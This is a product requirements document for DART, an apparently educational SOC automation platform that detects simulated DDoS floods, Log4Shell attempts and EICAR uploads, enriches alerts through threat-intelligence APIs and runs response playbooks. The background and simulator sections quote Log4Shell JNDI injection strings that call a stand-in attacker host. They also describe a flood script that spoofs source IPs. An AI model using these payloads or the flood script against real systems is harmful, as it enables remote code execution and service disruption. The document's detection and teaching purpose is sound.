# DART: Dynamic Routing & Alert Triage

**Product Requirements Document (PRD) — Global Context**
Version: 2.0
Stack: Next.js 14 (App Router), Node.js 18+, Docker, Docker Compose
Monorepo structure: Three services — dart-backend, dart-frontend, dummy-server
Language: JavaScript (ES Modules + CommonJS)
Styling: Tailwind CSS 3.4.1

---

## 1. Introduction

DART (Dynamic Routing & Alert Triage) is a full-stack SOC (Security Operations Center) automation platform that demonstrates end-to-end automated threat detection, enrichment, risk scoring, and incident response. It ingests security alerts from a simulated production server, enriches them with real-world threat intelligence from four external APIs, computes a weighted risk score, selects and executes the appropriate response playbook, and presents everything on a real-time dashboard.

DART supports three distinct attack scenarios:
1. **DDoS Flood Attacks** — volumetric HTTP flooding with IP spoofing
2. **Log4Shell Exploitation (CVE-2021-44228)** — JNDI injection via HTTP headers
3. **Malicious File Uploads** — EICAR test file detection with VirusTotal hash lookups

The system is containerized with Docker Compose and can be launched with a single command. All services communicate over REST APIs and Server-Sent Events (SSE) for real-time updates.

---

## 2. Literature Survey / Background

### 2.1 SOC Alert Fatigue
Modern Security Operations Centers receive thousands of alerts daily from firewalls, IDS/IPS, SIEM systems, and endpoint agents. Studies show that over 70% of SOC analysts experience alert fatigue, and the average time to detect and respond to a breach is 287 days (IBM Cost of a Data Breach Report, 2023). Manual triage is the primary bottleneck — analysts must open each alert, cross-reference multiple threat intelligence platforms, assess severity, and decide on a response action.

### 2.2 SOAR Platforms
Security Orchestration, Automation, and Response (SOAR) platforms like Splunk SOAR (formerly Phantom), Palo Alto XSOAR, and IBM Resilient address this by automating playbook execution. However, these are enterprise-grade products costing $50K–$500K+ annually, making them inaccessible for small teams and educational settings. DART provides a lightweight, open-source alternative that demonstrates the core SOAR concepts.

### 2.3 Threat Intelligence APIs
Threat intelligence enrichment is the process of augmenting raw alert data with contextual information from external databases:
- **GreyNoise** classifies IPs as malicious, benign, or unknown based on internet-wide scanning data
- **AbuseIPDB** aggregates community-reported abuse data with confidence scoring
- **VirusTotal** provides multi-engine antivirus scanning and IP reputation
- **GeoIP (ip-api.com)** provides geolocation and ISP data for IP addresses

### 2.4 CVE-2021-44228 (Log4Shell)
Log4Shell is a critical remote code execution vulnerability (CVSS 10.0) in Apache Log4j versions 2.0-beta9 through 2.14.1. Attackers inject JNDI lookup strings like `${jndi:ldap://attacker.com/exploit}` into HTTP headers, causing the server to fetch and execute remote code. DART demonstrates automated detection and containment of Log4Shell attacks.

### 2.5 Decision Tree Classification
DART uses a rule-based decision tree for playbook selection, evaluating conditions like request rate, abuse confidence scores, GreyNoise classification, and alert type. This approach provides deterministic, auditable decisions — critical for security automation where false positives can disrupt production systems.

---

## 3. Problem Statement

Security Operations Center (SOC) teams are overwhelmed by alert volume. Analysts manually triage each alert, pull context from multiple systems, assess severity, and select a response playbook — a process that is slow, error-prone, and does not scale for small teams.

Specifically:
1. **Manual Enrichment Bottleneck** — Analysts must switch between 4–6 different threat intelligence platforms per alert, spending 5–15 minutes on enrichment alone.
2. **Inconsistent Risk Assessment** — Without standardized scoring, two analysts may assign different severity levels to identical alerts, leading to inconsistent response times.
3. **Delayed Response** — Manual playbook execution (blocking IPs, adjusting rate limits, restarting services) takes 10–30 minutes. Automated execution reduces this to under 10 seconds.
4. **No Real-Time Visibility** — Traditional workflows lack a unified dashboard showing live alert feeds, server health, enrichment data, and playbook execution status in one place.

DART eliminates these bottlenecks by automating the entire pipeline: enrichment → scoring → playbook selection → playbook execution → real-time dashboard updates.

---

## 4. Software Requirements

### 4.1 Functional Requirements
| ID | Requirement | Status |
|---|---|---|
| FR-01 | Ingest raw alerts from the dummy server via REST POST | Implemented |
| FR-02 | Enrich source IPs using GreyNoise, AbuseIPDB, GeoIP, and VirusTotal in parallel | Implemented |
| FR-03 | Compute a weighted risk score (0–100) based on enrichment results | Implemented |
| FR-04 | Select the appropriate playbook using a decision tree | Implemented |
| FR-05 | Execute playbooks that call admin endpoints on the dummy server | Implemented |
| FR-06 | Store all processed alerts with full enrichment and playbook results | Implemented |
| FR-07 | Broadcast processed alerts to the frontend via SSE | Implemented |
| FR-08 | Display live alert feed, server status, logs, and historical alerts on dashboard | Implemented |
| FR-09 | Detect Log4Shell (CVE-2021-44228) attacks via HTTP header pattern matching | Implemented |
| FR-10 | Detect malicious file uploads via EICAR string detection and VirusTotal SHA256 lookups | Implemented |
| FR-11 | Provide dedicated pages for Log4Shell incident reports and VirusTotal file analysis | Implemented |

### 4.2 Non-Functional Requirements
| ID | Requirement | Status |
|---|---|---|
| NFR-01 | All three services must start with `docker compose up --build` | Implemented |
| NFR-02 | No external database — file-based storage (alerts.json) | Implemented |
| NFR-03 | Graceful degradation when API keys are missing (curated mock data) | Implemented |
| NFR-04 | Zero external npm dependencies beyond Next.js and React | Implemented |
| NFR-05 | All API enrichments must complete within 10 seconds via AbortSignal.timeout | Implemented |
| NFR-06 | Real-time dashboard updates within 1 second of alert processing | Implemented |

### 4.3 Technology Stack
| Layer | Technology | Version |
|---|---|---|
| Frontend Framework | Next.js (App Router) | 14.2.35 |
| UI Library | React | 18.x |
| CSS Framework | Tailwind CSS | 3.4.1 |
| Backend Framework | Next.js API Routes | 14.2.35 |
| Runtime | Node.js | 18+ |
| Containerization | Docker Compose | 3.x |
| Language | JavaScript (ES Modules) | ES2022 |

### 4.4 External APIs
| API | Purpose | Auth | Rate Limit |
|---|---|---|---|
| GreyNoise Community | IP classification (malicious/benign/unknown) | API Key | 50 req/day |
| AbuseIPDB | Community abuse reports and confidence scoring | API Key | 1000 req/day |
| VirusTotal | IP reputation and file hash analysis (68 AV engines) | API Key | 4 req/min |
| ip-api.com (GeoIP) | Country, city, ISP geolocation | None (free) | 45 req/min |

---

## 5. System Architecture

```
Traffic / Users / Attackers
      │
      ▼
Dummy Server (Next.js API — port 3002)
  ├── /api/data          — production endpoint (subject to rate limiting + IP blocking)
  ├── /api/health        — server state: status, requestsPerMinute, blockedIPs, rateLimit
  ├── /api/logs          — last 100 in-memory log entries
  ├── /api/upload        — file upload endpoint (EICAR detection + SHA256 hashing)
  ├── /api/admin/block-ip       — block an IP address
  ├── /api/admin/unblock-ip     — unblock a previously blocked IP
  ├── /api/admin/set-rate-limit — change the rate limit cap
  ├── /api/admin/restart        — reset server state to defaults
  ├── /api/admin/quarantine-file — quarantine an uploaded file
  ├── Anomaly Detector (10s interval) — fires DDoS alerts when req/min > 200
  ├── Log4Shell Detector        — scans HTTP headers for JNDI injection patterns
  └── Upload Alert Firer        — fires alerts for file uploads to DART
           │
           ▼ (POST /api/alerts/ingest)
      DART Backend (Next.js API — port 3001)
        ├── Step 1: Parse & validate incoming alert payload
        ├── Step 2: Enrich source IP (4 APIs in parallel via Promise.all)
        │     ├── GreyNoise API
        │     ├── AbuseIPDB API
        │     ├── GeoIP (ip-api.com)
        │     ├── VirusTotal IP Reputation
        │     └── VirusTotal File Hash Lookup (for malicious_upload only)
        ├── Step 3: Normalize → StandardAlert with weighted risk score
        ├── Step 4: Decision Tree → Playbook Selection
        ├── Step 5: Playbook Executor → call admin endpoints
        ├── Step 6: Store to alerts.json (append-only)
        └── Step 7: Broadcast via SSE to connected clients
             │
             ▼
       DART Frontend (Next.js App — port 3000)
         ├── / (Dashboard)
         │    ├── Live Alert Feed (SSE EventSource stream)
         │    ├── Server Status Panel (polling /api/health every 3s)
         │    ├── Log Viewer (polling /api/logs every 5s)
         │    └── Historical Alerts Table (/api/alerts/history)
         ├── /virustotal — VirusTotal file analysis reports page
         │    ├── Reports list with detection rate bars
         │    └── Full VT report: file info, detection summary gauge, engine breakdown table
         └── /log4shell — Log4Shell incident reports page
              ├── CVE-2021-44228 critical banner
              ├── Incident feed with JNDI payloads
              └── Full incident report: CVE details, attacker intel, payload forensics, response actions
```

---

## 6. Design Methodology

### 6.1 Monorepo Layout
```
/dart/
├── docker-compose.yml                    # Orchestrates all 3 services
├── .env                                  # API keys and service URLs
├── dart-backend/
│   ├── Dockerfile
│   ├── package.json                      # Dependencies: next@14.2.35, react@18
│   └── src/
│       ├── app/api/
│       │   ├── alerts/ingest/route.js    # POST: 7-step processing pipeline
│       │   ├── alerts/history/route.js   # GET: return all stored alerts
│       │   ├── alerts/stream/route.js    # GET: SSE EventSource endpoint
│       │   ├── virustotal/reports/       # GET: aggregated VT file reports
│       │   ├── virustotal/[sha256]/      # GET: individual VT file lookup
│       │   └── status/route.js           # GET: health check
│       ├── lib/
│       │   ├── enrichment.js             # 4 API enrichment functions + VT file lookup
│       │   ├── normalizer.js             # Raw alert → StandardAlert with risk scoring
│       │   ├── decisionTree.js           # Rule-based playbook selector
│       │   ├── store.js                  # Append-only alerts.json file storage
│       │   ├── sseManager.js             # SSE client connection manager
│       │   └── playbooks/
│       │       ├── ddos-mitigation.js          # DDoS response: block → throttle → restore
│       │       ├── ip-block.js                 # Simple IP blocking
│       │       ├── rate-limit-escalation.js    # Rate limit adjustment + analyst flag
│       │       ├── file-quarantine.js          # File quarantine + IP block
│       │       └── log4shell-patch-isolate.js  # CVE-2021-44228 isolation + incident report
│       └── data/
│           └── alerts.json               # Persistent alert history (append-only)
├── dart-frontend/
│   ├── Dockerfile
│   ├── package.json                      # Dependencies: next, react, tailwindcss
│   └── src/app/
│       ├── page.js                       # Dashboard: AlertFeed + ServerStatus + LogViewer + History
│       ├── virustotal/page.js            # VirusTotal file analysis reports (split-panel)
│       ├── log4shell/page.jsx            # Log4Shell incident reports (split-panel)
│       ├── globals.css                   # Tailwind theme + dark-mode SOC styling
│       ├── layout.js                     # Root layout with Inter font
│       └── components/
│           ├── NavHeader.jsx             # Sticky nav bar: logo, page links, live clock
│           ├── AlertFeed.jsx             # Real-time SSE alert cards with risk badges
│           ├── ServerStatus.jsx          # Server health: status, req/min, blocked IPs, rate limit
│           ├── LogViewer.jsx             # Live server logs with level-based color coding
│           └── HistoricalTable.jsx       # Sortable, filterable alert history table
├── dummy-server/
│   ├── Dockerfile
│   ├── package.json                      # Dependencies: next, react
│   ├── instrumentation.js               # Server startup hook for Log4Shell detector
│   └── src/
│       ├── app/api/
│       │   ├── data/route.js             # GET: protected endpoint (rate limit + IP block)
│       │   ├── health/route.js           # GET: full server state
│       │   ├── logs/route.js             # GET: last 100 log entries
│       │   ├── upload/route.js           # POST: file upload + EICAR detection + SHA256
│       │   └── admin/
│       │       ├── block-ip/route.js     # POST: add IP to blocklist
│       │       ├── unblock-ip/route.js   # POST: remove IP from blocklist
│       │       ├── set-rate-limit/route.js # POST: update rate limit cap
│       │       ├── restart/route.js      # POST: reset all server state
│       │       └── quarantine-file/route.js # POST: quarantine an uploaded file
│       └── lib/
│           ├── state.js                  # Global mutable state + anomaly detector (10s loop)
│           ├── middleware.js             # Request tracking, IP blocking, rate limiting
│           ├── anomalyDetector.js        # Background DDoS anomaly detector (standalone)
│           ├── log4shellDetector.js      # JNDI pattern matcher for HTTP headers
│           ├── log4shellAlertFirer.js    # Fires Log4Shell alerts to DART backend
│           └── uploadAlertFirer.js       # Fires malicious upload alerts to DART backend
└── scripts/
    └── ddos.js                           # DDoS attack simulator (10 req/sec, 3 min duration)
```

### 6.2 Data Flow (UML Sequence)
```
Attacker → Dummy Server → Anomaly Detector → DART Backend → Enrichment APIs
                                                  ↓
                                            Normalizer (risk score)
                                                  ↓
                                            Decision Tree (playbook selection)
                                                  ↓
                                            Playbook Executor
                                                  ↓
                                    ┌─────────────┴─────────────┐
                                    ↓                           ↓
                              Dummy Server                DART Frontend
                           (admin actions)             (SSE broadcast + store)
```

---

## 7. Data Schemas

### 7.1 StandardAlert Object (output of normalizer, input to decision tree)
```json
{
  "id": "uuid-v4",
  "timestamp": "ISO8601",
  "source_ip": "1.2.3.4",
  "enriched_ip": "1.2.3.4",
  "alert_type": "ddos | log4shell_attempt | malicious_upload | anomaly",
  "severity": "critical | high | medium | low",
  "raw_alert": { "...original payload..." },
  "enrichment": {
    "enrichedIP": "1.2.3.4",
    "greynoise": { "classification": "malicious|benign|unknown", "name": "...", "tags": [] },
    "abuseipdb": { "abuseConfidenceScore": 0-100, "totalReports": 0, "countryCode": "..." },
    "geoip": { "country": "...", "city": "...", "isp": "..." },
    "virustotal": { "malicious": 0, "suspicious": 0, "harmless": 0 },
    "virustotal_file": {
      "found": true, "sha256": "...", "malicious": 62, "suspicious": 0,
      "detection_rate": 91, "total_engines": 68, "engines": {}, "tags": []
    }
  },
  "risk_score": 0-100,
  "risk_reasoning": "plain text explanation of scoring",
  "selected_playbook": "ddos-mitigation | ip-block | rate-limit-escalation | file-quarantine | log4shell-patch-isolate",
  "playbook_status": "pending | executing | completed | failed",
  "playbook_result": { "...execution output..." },
  "analyst_feedback": null,
  "file_name": "eicar.txt (malicious_upload only)",
  "sha256": "hash (malicious_upload only)",
  "cve_id": "CVE-2021-44228 (log4shell only)",
  "jndi_url": "ldap://... (log4shell only)",
  "matched_headers": [{ "header": "...", "value": "...", "pattern": "..." }]
}
```

### 7.2 Playbook Response Object
```json
{
  "playbook_id": "ddos-mitigation",
  "steps_executed": ["block_ip", "tighten_rate_limit", "wait_5s", "restore_rate_limit", "restart_server", "schedule_ip_unblock_30s"],
  "success": true,
  "ip_blocked": "1.2.3.4",
  "restored_at": "ISO8601",
  "notes": "descriptive summary of actions taken"
}
```

---

## 8. Enrichment APIs — Detailed

All four API calls run **in parallel** via `Promise.all`. Each is wrapped in try/catch with a fallback default so a single API failure never breaks the pipeline.

When API keys are missing or set to `"your_key_here"`, the system falls back to **curated mock data** for 5 known-malicious IPs, ensuring the demo always produces realistic enrichment results.

Internal/Docker IPs (127.x, 192.168.x, 10.x, ::1) are automatically swapped with a random known-bad IP for enrichment.

| API | Purpose | Key field used in decision tree | Endpoint |
|---|---|---|---|
| GreyNoise Community | IP classification | `classification` | `GET /v3/community/{ip}` |
| AbuseIPDB | Community abuse reports | `abuseConfidenceScore` | `GET /api/v2/check?ipAddress={ip}` |
| GeoIP (ip-api.com) | Geolocation | `country`, `isp` | `GET /json/{ip}` |
| VirusTotal (IP) | IP reputation | `malicious` vote count | `GET /api/v3/ip_addresses/{ip}` |
| VirusTotal (File) | File hash analysis (68 AV engines) | `detection_rate`, `malicious` | `GET /api/v3/files/{sha256}` |

---

## 9. Risk Scoring Algorithm

Risk scores are computed using a **weighted formula** that varies by alert type:

### 9.1 DDoS / Anomaly Alerts
```
risk_score = min(100, sum of):
  - request_rate / 10                     (max 40 points)
  - abuseConfidenceScore × 0.3            (max 30 points)
  - greynoise == "malicious" ? 20 : 0     (20 points)
  - min(VT_malicious × 5, 10)             (max 10 points)
```

### 9.2 Log4Shell Alerts
```
risk_score = min(100, sum of):
  - Base score: 70 (always critical)
  - CVSS 10.0 confirmed: +15
  - GreyNoise Log4Shell tag: +10 (or malicious classification: +5)
  - AbuseIPDB contribution: min(score × 0.05, 5)
```

### 9.3 Malicious Upload Alerts
```
risk_score = min(100, sum of):
  - Base: malicious > 0 ? 30 : 5
  - detection_rate × 0.6                  (max 60 points)
  - abuseConfidenceScore × 0.2            (max 20 points)
  - greynoise == "malicious" ? +10 : 0    (10 points)
```

### 9.4 Severity Mapping
| Score Range | Severity |
|---|---|
| 85–100 | Critical |
| 60–84 | High |
| 40–59 | Medium |
| 0–39 | Low |

---

## 10. Decision Tree Logic

```
IF alert_type == "log4shell_attempt"
    → Playbook: log4shell-patch-isolate   [risk_score: 85-100]

ELSE IF alert_type == "malicious_upload"
    AND (VT detection_rate > 50 OR VT malicious > 10 OR eicar_detected)
    → Playbook: file-quarantine           [risk_score: variable]

ELSE IF request_rate > 500 req/min
    AND (abuseScore > 50 OR greynoise.classification == "malicious")
    → Playbook: ddos-mitigation           [risk_score: 85-100]

ELSE IF abuseScore > 30
    AND greynoise.classification == "malicious"
    → Playbook: ip-block                  [risk_score: 60-84]

ELSE IF request_rate > 200 req/min
    AND anomaly_detected == true
    → Playbook: rate-limit-escalation     [risk_score: 40-59]

ELSE
    → Log and monitor only                [risk_score: 0-39]
```

---

## 11. Playbooks — Detailed

### Playbook 1: `ddos-mitigation`
**Trigger:** High-volume flood attack confirmed by enrichment (rate > 500, abuse score > 50 or GreyNoise malicious)
**Steps:**
1. Block attacker IP → `POST /api/admin/block-ip { ip }`
2. Tighten rate limit to 10 req/min → `POST /api/admin/set-rate-limit { limit: 10 }`
3. Wait 5 seconds (let mitigation take effect)
4. Restore rate limit to 100 req/min → `POST /api/admin/set-rate-limit { limit: 100 }`
5. Restart server to reset state → `POST /api/admin/restart`
6. Schedule IP unblock after 30 seconds → `setTimeout(30s)` → `POST /api/admin/unblock-ip { ip }`

### Playbook 2: `ip-block`
**Trigger:** Known malicious IP, moderate traffic (abuse > 30, GreyNoise malicious)
**Steps:**
1. Block attacker IP → `POST /api/admin/block-ip { ip }`

### Playbook 3: `rate-limit-escalation`
**Trigger:** Anomalous traffic, not confirmed malicious (rate > 200, anomaly_detected true)
**Steps:**
1. Reduce rate limit to 50 req/min → `POST /api/admin/set-rate-limit { limit: 50 }`
2. Flag alert as "requires analyst review"

### Playbook 4: `file-quarantine`
**Trigger:** Malicious file upload detected (VT detection_rate > 50 or EICAR detected)
**Steps:**
1. Quarantine file on dummy server → `POST /api/admin/quarantine-file { upload_id, sha256, reason }`
2. Block uploading IP → `POST /api/admin/block-ip { ip }`

### Playbook 5: `log4shell-patch-isolate`
**Trigger:** Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0)
**Steps:**
1. Block attacker IP → `POST /api/admin/block-ip { ip }`
2. Tighten rate limit to 20 req/min → `POST /api/admin/set-rate-limit { limit: 20 }`
3. Flag JNDI endpoint for patching → `POST /api/admin/flag-endpoint { param, payload, cve }`
4. Wait 3 seconds (simulate patch application)
5. Restore rate limit to 100 req/min → `POST /api/admin/set-rate-limit { limit: 100 }`
6. Schedule IP unblock after 5 minutes → `setTimeout(300s)` → `POST /api/admin/unblock-ip { ip }`
7. Generate full incident report with: CVE details, CVSS vector, attacker intel, JNDI payload forensics, remediation steps, patch recommendations

---

## 12. Dummy Server Behaviour

- **Normal state:** responds to all requests with 200, tracks request counts per minute via rolling window, maintains an in-memory log array (last 500 entries)
- **Under DDoS attack:** request rate exceeds threshold, server status changes to "degraded", starts returning 429 (rate limited) and 403 (IP blocked)
- **Anomaly detection:** a background `setInterval` (10s) checks `requestsPerMinute`; if > 200, the server identifies the most frequent source IP from the last 50 requests and POSTs an alert to `dart-backend/api/alerts/ingest`
- **Log4Shell detection:** middleware scans all incoming HTTP headers against 5 JNDI regex patterns and 10 commonly-injected headers (User-Agent, X-API-Version, Referer, Authorization, etc.)
- **File upload handling:** computes SHA256 hash, checks for EICAR test string, fires alert to DART backend for VirusTotal analysis
- **Admin endpoints (internal, no auth):** block-ip, unblock-ip, set-rate-limit, restart, quarantine-file

---

## 13. Attack Simulation Scripts

### 13.1 DDoS Simulator (`scripts/ddos.js`)
Plain Node.js script using native `fetch`. Fires 10 concurrent HTTP requests per second to `dummy-server/api/data` for 3 minutes (configurable). Uses 5 known-malicious IPs for `X-Forwarded-For` and `X-Real-IP` header spoofing. Features `AbortSignal.timeout(3000)` per request, real-time status logging with 429/403 detection indicators.

**Known-malicious IPs used:**
- 185.220.101.34 (Tor exit node, Germany)
- 45.142.212.100 (Mass scanner, Russia)
- 89.248.167.131 (Recyber scanning, Netherlands)
- 198.235.24.130 (Known botnet C2, USA)
- 80.82.77.139 (Censys scanner, Netherlands)

### 13.2 Log4Shell Attack Simulator
Sends HTTP requests with JNDI injection payloads in headers like User-Agent, X-API-Version, and Referer. Example payload: `${jndi:ldap://attacker.com:1389/exploit}`.

### 13.3 Malicious Upload Simulator
Uploads the EICAR test file (antivirus industry standard test file, SHA256: `275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f`) to the dummy server's `/api/upload` endpoint.

---

## 14. Frontend Dashboard

### 14.1 Dashboard Page (`/`)
Single-page SOC dashboard with 4 panels:

| Panel | Data Source | Update Mechanism |
|---|---|---|
| Live Alert Feed | DART Backend SSE `/api/alerts/stream` | EventSource real-time stream |
| Server Status | Dummy Server `/api/health` | Polling every 3 seconds |
| Log Viewer | Dummy Server `/api/logs` | Polling every 5 seconds |
| Historical Alerts | DART Backend `/api/alerts/history` | On load + after each new alert |

### 14.2 VirusTotal Reports Page (`/virustotal`)
Split-panel layout showing complete VirusTotal file scan results:
- **Left panel (40%):** Reports list with file names, detection rate progress bars, risk scores, and playbook status badges
- **Right panel (60%):** Full report with file information (name, size, SHA256, type), detection summary (circular gauge + stat boxes for malicious/suspicious/harmless/undetected), risk assessment, and paginated engine results table (68 AV engines with search and filter)

### 14.3 Log4Shell Reports Page (`/log4shell`)
Dedicated CVE-2021-44228 incident response page:
- **Banner:** Critical CVE alert with CVSS 10.0 badge
- **Stats row:** Total attempts, unique attacker IPs, playbooks executed, average response time
- **Left panel (35%):** Incident feed with timestamps, attacker IPs, JNDI payloads, and playbook status
- **Right panel (65%):** Full incident report with CVE details (CVSS vector), attacker intelligence (GeoIP, GreyNoise tags, AbuseIPDB scores), extracted JNDI payload forensics, automated remediation actions, and patch recommendations with links to NVD, Apache Security Bulletin, and CISA KEV catalog

### 14.4 Navigation
Sticky top nav bar with:
- DART logo and "Dynamic Routing & Alert Triage" subtitle
- Page links: Dashboard, VT Reports, Log4Shell
- Live clock (updates every second)
- SSE connection status indicator (green pulse = connected, red pulse = disconnected)

---

## 15. Docker Compose Setup

Three services on a shared bridge network `dart-net`:

| Service | Port | Image | Volume |
|---|---|---|---|
| dart-backend | 3001 | ./dart-backend | ./dart-backend/src/data:/app/src/data (alerts.json persistence) |
| dart-frontend | 3000 | ./dart-frontend | None |
| dummy-server | 3002 | ./dummy-server | None |

**Build & run:** `docker compose up --build`

Frontend `NEXT_PUBLIC_*` variables are injected at build time via Docker build args.

---

## 16. Environment Variables

```
# dart-backend (.env at root)
GREYNOISE_API_KEY=          # Optional — falls back to curated mock data
ABUSEIPDB_API_KEY=          # Optional — falls back to curated mock data
VIRUSTOTAL_API_KEY=         # Optional — falls back to EICAR mock data
DUMMY_SERVER_URL=http://dummy-server:3002    # Docker
DART_BACKEND_URL=http://dart-backend:3001    # Docker

# dart-frontend (build-time args or .env)
NEXT_PUBLIC_DART_BACKEND_URL=http://localhost:3001
NEXT_PUBLIC_DUMMY_SERVER_URL=http://localhost:3002
```

---

## 17. Results & Testing

### 17.1 DDoS Scenario
Running `node scripts/ddos.js` produces:
- **1800 requests** sent over 3 minutes at 10 req/sec with spoofed IPs
- Dummy server detects anomaly → status changes to "degraded" → fires alert to DART backend
- DART enriches the attacker IP (GreyNoise: malicious, AbuseIPDB: 100%, VT: 12 votes)
- Risk score: 85–100 (critical) → selects `ddos-mitigation` playbook
- Playbook blocks IP (→403s), tightens rate limit (→429s), waits 5s, restores, restarts, schedules unblock
- Dashboard shows alert with green "completed" badge and all 6 steps listed
- After 30s, IP is automatically unblocked

### 17.2 Log4Shell Scenario
Simulating a Log4Shell attack produces:
- JNDI payload detected in HTTP headers by regex pattern matcher
- Alert fired with CVE-2021-44228 metadata (CVSS 10.0)
- Risk score: 90+ (critical) → selects `log4shell-patch-isolate` playbook
- Playbook blocks IP, tightens rate limit, flags endpoint, simulates patch, restores rate limit
- Full incident report generated with forensic JNDI payload analysis
- Log4Shell page shows incident feed + detailed report with CVE details and remediation steps

### 17.3 Malicious Upload Scenario
Uploading EICAR test file produces:
- File received, SHA256 computed, EICAR string detected locally
- Alert fired to DART backend with file metadata
- DART performs VirusTotal file hash lookup: 62/68 engines detect as malicious (91% detection rate)
- Risk score: 85+ (critical) → selects `file-quarantine` playbook
- File quarantined on dummy server, uploading IP blocked
- VirusTotal page shows full scan report with per-engine breakdown (searchable, filterable, paginated)

---

## 18. Future Scope

1. **Machine Learning-Based Risk Scoring** — Replace the rule-based decision tree with an ML model trained on historical alert data for more nuanced threat classification.
2. **Multi-Tenant Support** — Enable multiple organizations to share the DART platform with isolated dashboards and alert stores.
3. **Analyst Feedback Loop** — Allow SOC analysts to provide feedback on playbook decisions (approve/reject/escalate), creating a feedback dataset for model training.
4. **Additional Enrichment Sources** — Integrate Shodan, OTX AlienVault, URLhaus, and CIRCL Passive DNS for broader threat intelligence coverage.
5. **Persistent Database** — Migrate from file-based storage (alerts.json) to PostgreSQL or MongoDB for production-scale alert storage with full-text search.
6. **Alert Correlation Engine** — Detect multi-stage attack campaigns by correlating alerts across time windows and IP addresses.
7. **Webhook & Email Notifications** — Send playbook execution summaries to Slack, Teams, PagerDuty, or email for on-call alerting.
8. **Role-Based Access Control** — Add authentication and authorization for SOC analyst, manager, and admin roles.
9. **Threat Intelligence Caching** — Cache API responses with TTL to reduce external API calls and improve response times.
10. **Kubernetes Deployment** — Provide Helm charts and Kubernetes manifests for cloud-native deployment at scale.

---

## 19. References

1. IBM Security. "Cost of a Data Breach Report 2023." IBM, 2023. https://www.ibm.com/reports/data-breach
2. Gartner. "Market Guide for Security Orchestration, Automation and Response Solutions." Gartner Research, 2023.
3. MITRE ATT&CK Framework. https://attack.mitre.org/
4. NIST CVE-2021-44228 (Log4Shell). National Vulnerability Database. https://nvd.nist.gov/vuln/detail/CVE-2021-44228
5. Apache Log4j Security Vulnerabilities. https://logging.apache.org/log4j/2.x/security.html
6. GreyNoise Intelligence API Documentation. https://docs.greynoise.io/
7. AbuseIPDB API Documentation. https://docs.abuseipdb.com/
8. VirusTotal API v3 Documentation. https://docs.virustotal.com/reference/overview
9. ip-api.com Geolocation API. https://ip-api.com/docs/
10. EICAR Anti-Virus Test File. European Institute for Computer Antivirus Research. https://www.eicar.org/download-anti-malware-testfile/
11. CISA Known Exploited Vulnerabilities Catalog. https://www.cisa.gov/known-exploited-vulnerabilities-catalog
12. Next.js 14 Documentation. https://nextjs.org/docs
13. Docker Compose Documentation. https://docs.docker.com/compose/
14. Tailwind CSS Documentation. https://tailwindcss.com/docs
15. OWASP Top 10 — 2021. https://owasp.org/Top10/

---